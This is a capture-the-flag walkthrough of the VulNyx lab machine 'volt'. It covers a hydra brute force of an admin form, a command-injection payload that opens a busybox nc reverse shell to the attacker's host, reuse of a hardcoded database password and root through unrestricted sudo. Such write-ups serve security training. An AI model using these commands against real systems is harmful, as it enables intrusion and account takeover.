# volt

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| volt | Linux | batusai | Medium | VulNyx |

**Summary:** The Volt machine answered on only two ports, OpenSSH 10.0p2 and an nginx front end serving a fictional electronics store, so every path into the box ran through the web application. Content discovery mapped the storefront and returned four entries worth keeping: `/admin` served a staff login form, `/api` returned a 111 byte stub, `/login` and `/register` exposed the customer flow, and `/secret` answered 403, which proves the path exists behind an access rule rather than missing entirely. The admin form had no throttling and leaked a single failure oracle, the string `Invalid username or password`, so a hydra HTTP POST run against rockyou recovered `admin:chocolate3` in under four minutes. The authenticated console exposed a System Diagnostics card that passed its input straight into a shell, so submitting `127.0.0.1$(id)` returned the output of `id` and confirmed command substitution as `www-data`, and the same field delivered a `busybox nc` reverse shell into a penelope listener. Enumerating `/opt/volt` then surfaced a `config.py` readable by the `www-data` group that hardcoded the database credentials of the local account `batusai` with the password `V0lt_db_S3cr3t_2026`, which the `su` prompt accepted, and since the account could run `(ALL : ALL) ALL` under sudo, `sudo -i` produced a root shell and both flags were read in one command.

---

## Reconnaissance

The engagement opened on a bridged VirtualBox network, so a fast ARP sweep was enough to enumerate live hosts before any service work began. From there the workflow moved through a full TCP port sweep, targeted service and version detection, fingerprinting, and web content discovery against the storefront.

1. Host discovery with an ARP ping sweep:

```bash
❯ sudo nmap -sn -PR 192.168.56.0/24                          
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 08:03 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:EA:FB:35 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.219
Host is up (0.00067s latency).
MAC Address: 08:00:27:B6:00:FA (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.23 seconds
```

Three hosts answered. `192.168.56.100` is the VirtualBox host adapter and `192.168.56.1` is the gateway, so the only unknown system on the segment was `192.168.56.219`, which became the target.

2. The address was stored in a shell variable so every later command in the log could reuse it verbatim:

```bash
❯ ip=192.168.56.219
```

3. A full TCP port sweep against the target:

```bash
❯ nmap -p- -Pn $ip                          
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 08:05 +0700
Nmap scan report for 192.168.56.219
Host is up (0.00025s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
```

65533 ports were closed and exactly two services answered, SSH on 22 and HTTP on 80. No database, no alternate web port, no management plane, so the reachable surface was the storefront and the SSH daemon alone.

4. Service and script detection pinned the versions and pulled the site title:

```bash
❯ nmap -p 22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 08:05 +0700
Nmap scan report for 192.168.56.219
Host is up (0.00093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Volt - Electronics Store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```

The SSH build is a current Debian OpenSSH release, which rules out legacy daemon flaws, and nginx disclosed no version banner. Any entry point had to come from the web application rather than the platform underneath it.

5. Fingerprinting with whatweb:

```bash
❯ whatweb http://$ip/
http://192.168.56.219/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.56.219], Title[Volt - Electronics Store], nginx
```

whatweb added nothing beyond the HTTP title, and that absence is itself informative. No CMS meta generator, no framework specific cookie, and no server header beyond nginx, which points at a custom application rather than an off the shelf product with published exploits.

6. Content discovery against the storefront:

```bash
❯ gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.219
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
contact              (Status: 200) [Size: 2789]
about                (Status: 200) [Size: 3138]
search               (Status: 200) [Size: 6647]
privacy              (Status: 200) [Size: 2779]
blog                 (Status: 200) [Size: 3033]
faq                  (Status: 200) [Size: 3192]
products             (Status: 200) [Size: 6644]
login                (Status: 200) [Size: 3097]
support              (Status: 200) [Size: 2825]
register             (Status: 200) [Size: 3313]
terms                (Status: 200) [Size: 2759]
careers              (Status: 200) [Size: 2968]
admin                (Status: 200) [Size: 3121]
audio                (Status: 200) [Size: 3333]
account              (Status: 200) [Size: 2741]
FAQ                  (Status: 200) [Size: 3192]
cart                 (Status: 200) [Size: 3838]
Products             (Status: 200) [Size: 6644]
Search               (Status: 200) [Size: 6647]
Contact              (Status: 200) [Size: 2789]
About                (Status: 200) [Size: 3138]
Privacy              (Status: 200) [Size: 2779]
Login                (Status: 200) [Size: 3097]
Support              (Status: 200) [Size: 2825]
gaming               (Status: 200) [Size: 3345]
api                  (Status: 200) [Size: 111]
Blog                 (Status: 200) [Size: 3033]
phones               (Status: 200) [Size: 3338]
accessories          (Status: 200) [Size: 3364]
laptops              (Status: 200) [Size: 3352]
orders               (Status: 200) [Size: 2752]
checkout             (Status: 200) [Size: 3372]
deals                (Status: 200) [Size: 3376]
shipping             (Status: 200) [Size: 2767]
Careers              (Status: 200) [Size: 2968]
Audio                (Status: 200) [Size: 3333]
wishlist             (Status: 200) [Size: 2684]
Terms                (Status: 200) [Size: 2759]
Register             (Status: 200) [Size: 3313]
Laptops              (Status: 200) [Size: 3352]
secret               (Status: 403) [Size: 2794]
Account              (Status: 200) [Size: 2741]
Accessories          (Status: 200) [Size: 3364]
Cart                 (Status: 200) [Size: 3838]
wearables            (Status: 200) [Size: 3351]
API                  (Status: 200) [Size: 111]
Faq                  (Status: 200) [Size: 3192]
Gaming               (Status: 200) [Size: 3345]
Phones               (Status: 200) [Size: 3338]
Shipping             (Status: 200) [Size: 2767]
SEARCH               (Status: 200) [Size: 6647]
CONTACT              (Status: 200) [Size: 2789]
Checkout             (Status: 200) [Size: 3372]
SUPPORT              (Status: 200) [Size: 2825]
WishList             (Status: 200) [Size: 2684]
PRIVACY              (Status: 200) [Size: 2779]
Secret               (Status: 403) [Size: 2794]
Deals                (Status: 200) [Size: 3376]
ABOUT                (Status: 200) [Size: 3138]
Orders               (Status: 200) [Size: 2752]
PRODUCTS             (Status: 200) [Size: 6644]
LogIn                (Status: 200) [Size: 3097]
CAREERS              (Status: 200) [Size: 2968]
wishList             (Status: 200) [Size: 2684]
LOGIN                (Status: 200) [Size: 3097]
checkOut             (Status: 200) [Size: 3372]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

The scan consumed the whole 882228 entry wordlist and returned a coherent storefront rather than random hits. Every response above 2700 bytes was a real page, the mixed case duplicates are just the same routes echoed by the wordlist, `/api` returned a 111 byte body consistent with a small stub endpoint, and `/secret` answered 403, which confirms the path exists and is blocked rather than absent. The routes `/login`, `/register`, `/account`, `/cart`, `/checkout`, `/orders` and `/wishlist` describe a shopping flow, while `/admin` presented a staff login form and became the target.

---

## Initial Access

The admin form was the only authenticated surface reachable without a shell, and it showed no throttling, lockout, or captcha.

### Weak Administrator Password

7. A hydra HTTP POST attack against the admin login:

```bash
❯ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 192.168.56.219 http-post-form "/admin:username=^USER^&password=^PASS^:1=:F=Invalid username or password"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-22 09:20:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://192.168.56.219:80/admin:username=^USER^&password=^PASS^:1=:F=Invalid username or password
[STATUS] 4422.00 tries/min, 4422 tries in 00:01h, 14339976 to do in 54:03h, 16 active
[STATUS] 4460.33 tries/min, 13381 tries in 00:03h, 14331017 to do in 53:33h, 16 active
[80][http-post-form] host: 192.168.56.219   login: admin   password: chocolate3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-22 09:24:10
```

Hydra was pointed at the POST endpoint with the failure string as its only oracle, and it sustained roughly 4400 attempts per minute across 16 parallel tasks. `admin:chocolate3` was recovered 13381 attempts in, under four minutes from the start, which confirms the password is a plain dictionary entry rather than a targeted guess.

8. The credential opened the staff console, which exposed a statistics header and, more importantly, a System Diagnostics card accepting an address and offering a `Run test` button described as a ping against the internal network:

![Admin panel signed in as admin with the System Diagnostics ping field](<Pasted image 20261022092529.png>)

That card is the only writable input in the console and the obvious candidate for injection, so the next probe went straight at it.

9. The panel was tested with `127.0.0.1$(id)` and echoed `ping: groups=33(www-data): Name or service not known`, which is the output of `id` being consumed by `ping` as if it were a hostname. A single response proves two things at once: the field is concatenated into a shell command without escaping, and the process runs as `www-data`. The payload `127.0.0.1$(busybox nc 192.168.56.1 6666 -e /bin/bash)` keeps a valid loopback argument in front so the surrounding `ping` invocation still parses, while the substitution spawns the shell and connects back.

10. A penelope listener was already waiting on port 6666:

```bash
❯ penelope -p 6666
[+] Listening for reverse shells on 0.0.0.0:6666 -> 127.0.0.1 • 172.16.163.108 • 172.17.0.1 • 192.168.56.1 • 172.16.0.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => volt 192.168.56.219 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/setyanoegraha/.penelope/sessions/volt~192.168.56.219-Linux-x86_64/2026_10_22-09_26_16-874-www-data_33.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@volt:/opt/volt$ id;whoami;hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
volt
```

Penelope identified the callback as `volt` running `Linux-x86_64` and reported the user as `www-data` with uid 33. It auto deployed its Python agent over `/usr/bin/python3` and handed over a PTY session, so the usual `script` and `stty` sequence was unnecessary; the shell was already interactive with job control available.

### Enumerating the Application Directory

11. Listing the application directory:

```bash
www-data@volt:/opt/volt$ ls -la
total 44
drwxr-xr-x 6 www-data www-data  4096 Jul 30 06:15 .
drwxr-xr-x 3 root     root      4096 Jul 30 05:50 ..
-rwxr-xr-x 1 www-data www-data 15314 Jul 30 05:50 app.py
-rw-r----- 1 root     www-data   222 Jul 30 06:15 config.py
drwxr-xr-x 2 www-data www-data  4096 Jul 30 06:03 __pycache__
drwxr-xr-x 2 www-data www-data  4096 Jul 30 05:50 static
drwxr-xr-x 2 www-data www-data  4096 Jul 30 05:50 templates
drwxr-xr-x 5 www-data www-data  4096 Jul 30 05:50 venv
```

The application lived in `/opt/volt` with its virtual environment alongside it. `config.py` stood out immediately: owned by `root` but readable by the `www-data` group, which is exactly the class of file a compromised web account can read.

12. Reading the account database:

```bash
www-data@volt:/opt/volt$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
batusai:x:1000:1000:leo,,,:/home/batusai:/bin/bash
```

The file listed a single human account, `batusai` with uid 1000 and `/bin/bash`, while everything else was a service account with `nologin`. That user's home directory was not readable by `www-data`, so the route into the account had to come from credentials rather than files.

---

## Lateral Movement

The web shell belonged to a service account, and one human account still had to be reached.

### Hardcoded Database Credentials Reused for the System Account

13. Enumerating home directories, reading the configuration, and switching user:

```bash
www-data@volt:/opt/volt$ ls -la /home
total 12
drwxr-xr-x  3 root    root    4096 Jul 30 05:18 .
drwxr-xr-x 18 root    root    4096 Jul 30 05:08 ..
drwx------  3 batusai batusai 4096 Aug  1 05:30 batusai
www-data@volt:/opt/volt$ cat config.py 
# Volt store - database configuration
# TODO: move secrets to environment variables before production rollout
DB_HOST = "127.0.0.1"
DB_PORT = 3306
DB_NAME = "volt_store"
DB_USER = "batusai"
DB_PASS = "V0lt_db_S3cr3t_2026"
www-data@volt:/opt/volt$ su - batusai
Password: 
batusai@volt:~$ id
uid=1000(batusai) gid=1000(batusai) groups=1000(batusai),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
```

The home listing confirmed `/home/batusai` is mode 0700, so its contents were invisible to the web account. `config.py` however carried a `TODO` comment admitting the secrets had never been moved into environment variables, and the file hardcoded `DB_USER = "batusai"` together with `DB_PASS = "V0lt_db_S3cr3t_2026"`. The same password satisfied the `su` prompt, a textbook reuse of a service credential as a system password, and the resulting `id` shows the account belongs to the `sudo` and `users` groups among the usual desktop ones.

---

## Privilege Escalation

### Unrestricted Sudo Rights

14. Sudo policy review, root shell, and flag retrieval:

```bash
batusai@volt:~$ sudo -l
[sudo] password for batusai: 
Matching Defaults entries for batusai on volt:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User batusai may run the following commands on volt:
    (ALL : ALL) ALL
batusai@volt:~$ sudo -i
root@volt:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
volt
root@volt:~# cat /home/batusai/user.txt /root/root.txt 
a0b...
c21...
```

`sudo -l` returned a single line that ends the engagement: `(ALL : ALL) ALL`, with no command restriction, no password requirement on the escalated command, and `use_pty` configured, which hardens session handling rather than limiting the grant. `sudo -i` therefore produced a root login shell, `id;whoami;hostname` confirmed uid 0 on `volt`, and both flags were read in one command. The flag values in the log are abbreviated with trailing ellipses, so they are reproduced exactly as recorded.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep isolated the target at `192.168.56.219`, a full TCP scan returned only SSH on 22 and nginx on 80, and gobuster mapped the storefront routes including `/admin`, `/api`, and a forbidden `/secret`.

2. **Vulnerability Discovery**: The admin login accepted unlimited POST attempts with a single failure string as its oracle, and the authenticated System Diagnostics card passed user input into a shell command.

3. **Exploitation**: Hydra recovered `admin:chocolate3` from rockyou, and the ping field executed `127.0.0.1$(busybox nc 192.168.56.1 6666 -e /bin/bash)`, returning a PTY shell as `www-data` to a penelope listener.

4. **Internal Enumeration**: `/opt/volt/config.py` was group readable by `www-data` and hardcoded the database password `V0lt_db_S3cr3t_2026` for the local account `batusai`, which `su` accepted.

5. **Privilege Escalation**: `sudo -l` granted `(ALL : ALL) ALL` to `batusai`, so `sudo -i` produced a root shell and `cat /home/batusai/user.txt /root/root.txt` returned both flags.
